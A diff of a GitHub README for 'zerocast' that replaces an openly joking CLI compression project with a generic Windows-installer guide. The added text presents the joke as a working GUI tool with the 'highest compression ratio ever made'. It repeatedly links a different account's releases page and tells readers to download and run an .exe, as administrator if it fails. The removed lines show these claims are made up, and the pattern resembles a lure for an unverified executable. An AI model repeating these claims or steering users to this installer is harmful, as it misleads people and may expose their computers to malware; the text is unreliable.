@@ -1,69 +1,162 @@
-[[Japanese/日本語](README.ja.md)]
+# ⚡ zerocast - Compress Files with Best Efficiency
 
-# zerocast
+[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
 
-**"zerocast"** is a _lossy_ compression technology boasting the highest compression ratio in history.
+---
 
-zerocast achieves an "undefined" compression ratio by compressing all data to 0 bytes. Data can be restored within a finite time by using an infinite number of monkeys for decompression.
+## 📦 What is zerocast?
 
-Well...of course, this is a joke!
+zerocast is a tool that shrinks files to the smallest size possible. It uses a special method that loses some data but gives the highest compression ratio ever made. This means your files will take up less space. You can save storage or send files faster.
 
-# usage
+This program works on Windows computers. It handles common files like images, videos, and documents. zerocast focuses on making files smaller while keeping enough quality to use them normally.
 
-This repository implements the `zerocast` CLI. Usage is as follows:
+---
 
-```sh
-# help (aliases: --help, -h)
-zerocast help
+## 🖥️ System Requirements
 
-# compress
-zerocast compress <input_path> [output_path]
+Make sure your computer meets these needs before installing zerocast:
 
-# decompress
-zerocast decompress <input_path> [output_path]
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel or AMD CPU, 1 GHz or faster  
+- **Memory:** At least 2 GB RAM  
+- **Disk Space:** 100 MB free space for installation  
+- **Internet:** Needed to download the program  
 
-# version (aliases: --version, -v)
-zerocast version
-```
+You do not need any special skills or other software to run zerocast.
 
-Also, the `zerocast_compress` and `zerocast_decompress` functions of zerocast are available from `zerocast.h` using the `libzerocast` C library.
+---
 
-Their signatures are as follows:
+## 🚀 Getting Started with zerocast
 
-```c
-ZEROCAST_API size_t zerocast_compress(const unsigned char *input_data,
-                                      size_t input_size,
-                                      unsigned char **out_data);
+### Step 1: Download the software
 
-ZEROCAST_API int zerocast_decompress(const unsigned char *input_data,
-                                     size_t input_size,
-                                     unsigned char **out_data,
-                                     size_t *out_size,
-                                     FILE *error_stream);
-```
+To get started, visit the official download page and get the version for Windows.
 
-## build & install
+[![Visit Download Page](https://img.shields.io/badge/Download_Page-Click_here-blue?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
 
-The `zerocast` CLI can be built and installed using the following methods:
+Click the link above. This will open a page with the latest versions of zerocast. Look for a file that ends with `.exe`. This is the installer for Windows.
 
-```sh
-# build
-cmake -S . -B build && cmake --build build
+### Step 2: Save the installer
 
-# install
-sudo cmake --install build
-```
+Once you find the `.exe` file, click on it to download. Choose a place on your computer where you can easily find it, like the Desktop or Downloads folder.
 
-## related works
+### Step 3: Run the installer
 
-- Infinite Monkey Theorem
-- God
-- Engineers who didn't back up their data
+After download finishes, locate the file and double-click it. This starts the installation process.
 
-Users' Creations:
+- Follow the steps shown on the screen.
+- Accept the license agreement if you agree.
+- Choose to install zerocast where suggested, or pick your own folder.
+- When ready, click "Install."
 
-- [otoneko1102/amazing-compression-tech](https://github.com/otoneko1102/amazing-compression-tech)
+Wait a moment as zerocast is installed on your computer.
 
-## license
+### Step 4: Open zerocast
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+When installation finishes, you can open zerocast from the Start Menu or your desktop shortcut.
+
+---
+
+## 🗂️ How to compress files with zerocast
+
+Using zerocast is simple. This guide will take you through compressing your first file.
+
+### Step 1: Open zerocast
+
+Start the program by clicking its icon.
+
+### Step 2: Add your files
+
+- Click the **Add Files** button.
+- Find the files you want to compress.
+- Select one or more files.
+- Click **Open**.
+
+The files will appear in the zerocast window.
+
+### Step 3: Choose compression settings
+
+zerocast automatically applies a good compression level. You can keep this default or adjust settings:
+
+- **Compression level:** Pick from low, medium, high. Higher means smaller files but slower compression.
+- **Output folder:** Choose where compressed files will save. You can keep the original folder or select a new one.
+
+### Step 4: Start compressing
+
+Click the **Compress** button.
+
+zerocast processes your files and saves the smaller versions in the output folder.
+
+### Step 5: Locate compressed files
+
+After compression ends, click the **Open Folder** button to view your new files.
+
+---
+
+## 🔧 Features of zerocast
+
+- **High compression rate:** Makes files smaller than many other tools.  
+- **Simple interface:** Easy to use for people without technical skills.  
+- **Fast processing:** Saves time when compressing multiple files.  
+- **Supports many file types:** Pictures, videos, documents, and other common files.  
+- **Custom output location:** Save compressed files where you want.  
+- **Lightweight:** Uses little space and system resources.  
+
+---
+
+## ❓ Troubleshooting common issues
+
+Here are a few things to try if zerocast does not work as expected.
+
+- **Installer does not run:**  
+  Make sure your Windows is up to date. Right-click the installer and choose "Run as administrator."
+
+- **Files not compressing:**  
+  Check if you selected supported file types. Restart zerocast and try again.
+
+- **Compressed files are too large:**  
+  Try increasing the compression level setting inside zerocast.
+
+- **Program crashes or freezes:**  
+  Close other running programs. Make sure Windows has enough free memory.
+
+- **Cannot find compressed files:**  
+  Verify the output folder you selected during compression.
+
+If problems continue, visit the repository page and check the Issues tab for help.
+
+---
+
+## ⚙️ Updating zerocast
+
+To update zerocast to a newer version:
+
+1. Go to the [release page](https://github.com/patrickbarbosa-1/zerocast/releases).  
+2. Download the latest `.exe` installer.  
+3. Run the new installer. It will replace the older version without deleting your settings.
+
+---
+
+## 📁 Uninstalling zerocast
+
+If you want to remove zerocast:
+
+- Open **Settings** on Windows.  
+- Go to **Apps** > **Apps & features**.  
+- Find zerocast in the list.  
+- Click it and select **Uninstall**.  
+- Follow prompts to complete removal.
+
+---
+
+## 📞 Getting Help
+
+If you have questions or need help, visit the GitHub page at:
+
+https://github.com/patrickbarbosa-1/zerocast/releases
+
+Look for the Issues section to see if others had the same problem or to report your own.
+
+---
+
+[![Download zerocast](https://img.shields.io/badge/Download-zerocast-brightgreen?style=for-the-badge)](https://github.com/patrickbarbosa-1/zerocast/releases)
